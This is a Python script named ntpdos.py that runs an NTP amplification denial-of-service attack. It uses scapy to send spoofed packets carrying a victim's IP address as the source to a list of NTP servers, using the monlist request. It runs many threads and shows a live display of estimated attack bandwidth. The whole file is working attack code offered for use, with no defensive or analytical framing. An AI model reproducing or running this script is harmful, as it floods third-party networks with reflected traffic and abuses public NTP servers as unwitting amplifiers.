#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import threading
import time
import random
from datetime import datetime
from scapy.all import IP, UDP, Raw, send, conf

from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich import box

conf.verb = 0

MEAN_NTP_AMP        = 556.0   # Average amplification factor (Byte/Byte)
STD_NTP_AMP         = 68.0    # Standard deviation of amplification
NTP_REPLY_SIZE_BYTE = (468 - 48)  # Approx size of monlist response minus request
CONFIDENCE_LEVEL    = 0.95    # 95% Confidence Interval
Z_95                = 1.96    # Normal distribution 95% two-sided quantile

packets_sent = 0
stats_lock = threading.Lock()
console = Console()

def estimate_traffic(thread_cnt, pkt_per_thread=1):
    """
    Estimates peak and average traffic (bps) based on thread count.
    Returns (peak_bps, avg_bps)
    """
    from scipy.stats import gamma as gamma_dist
    lambda_req = thread_cnt * pkt_per_thread
    alpha = (MEAN_NTP_AMP / STD_NTP_AMP) ** 2
    beta  = MEAN_NTP_AMP / (STD_NTP_AMP ** 2)
    upper_amp = gamma_dist.ppf(CONFIDENCE_LEVEL, alpha, scale=1/beta)
    peak_pkt_bytes = NTP_REPLY_SIZE_BYTE * upper_amp
    avg_pkt_bytes = NTP_REPLY_SIZE_BYTE * MEAN_NTP_AMP
    peak_bps = peak_pkt_bytes * 8 * lambda_req
    avg_bps  = avg_pkt_bytes  * 8 * lambda_req
    return peak_bps, avg_bps

def load_servers(path):
    try:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[bold red]Error:[/bold red] File {path} not found.")
        sys.exit(1)

def attack_worker(target_ip, ntpsrvs, data):
    global packets_sent
    srv_count = len(ntpsrvs)
    local_idx = random.randint(0, srv_count - 1)
    
    while True:
        srv = ntpsrvs[local_idx % srv_count]
        local_idx += 1
        pkt = IP(dst=srv, src=target_ip) / \
              UDP(sport=random.randint(2000, 65535), dport=123) / \
              Raw(load=data)
        
        try:
            send(pkt, verbose=0)
            with stats_lock:
                packets_sent += 1
        except Exception:
            pass

def generate_stats_table(target, threads, start_time, peak_est, avg_est):
    elapsed = time.time() - start_time
    pps = packets_sent / elapsed if elapsed > 0 else 0
    current_mbps = (pps * NTP_REPLY_SIZE_BYTE * MEAN_NTP_AMP * 8) / 1e6

    table = Table(box=box.ROUNDED, expand=True)
    table.add_column("Metric", style="cyan")
    table.add_column("Value", style="magenta")
    
    table.add_row("Target IP", target)
    table.add_row("Active Threads", str(threads))
    table.add_row("Packets Sent", f"{packets_sent:,}")
    table.add_row("Uptime", f"{elapsed:.2f}s")
    table.add_row("Est. Current Bandwidth", f"[bold green]{current_mbps:.2f} Mbps[/bold green]")
    table.add_row("Theoretical Peak", f"{peak_est/1e6:.2f} Mbps")
    
    return table

def main():
    if len(sys.argv) != 4:
        console.print(Panel.fit(
            "[bold yellow]NTP Amplification[/bold yellow]\n"
            "Usage: python3 ntpdos.py <target_ip> <ntp_server_file> <threads>\n"
            "Example: python3 ntpdos.py 1.1.1.1 ntp.txt 10",
            title="Help", border_style="blue"
        ))
        sys.exit(0)

    target_ip = sys.argv[1]
    server_file = sys.argv[2]
    try:
        threads_num = int(sys.argv[3])
    except ValueError:
        console.print("[bold red]Error:[/bold red] Threads must be an integer.")
        sys.exit(1)

    ntpsrvs = load_servers(server_file)
    peak, avg = estimate_traffic(threads_num)

    # NTP Monlist Request Data (\x17 = NTP v3, Mode 7)
    data = b"\x17\x00\x03\x2a" + b"\x00" * 4
    
    start_time = time.time()

    # Start threads
    for _ in range(threads_num):
        t = threading.Thread(
            target=attack_worker, 
            args=(target_ip, ntpsrvs, data), 
            daemon=True
        )
        t.start()

    try:
        with Live(generate_stats_table(target_ip, threads_num, start_time, peak, avg), 
                 refresh_per_second=4) as live:
            while True:
                time.sleep(0.25)
                live.update(generate_stats_table(target_ip, threads_num, start_time, peak, avg))
    except KeyboardInterrupt:
        console.print("\n[bold yellow]![/bold yellow] Attack stopped by user.")

if __name__ == "__main__":
    main()
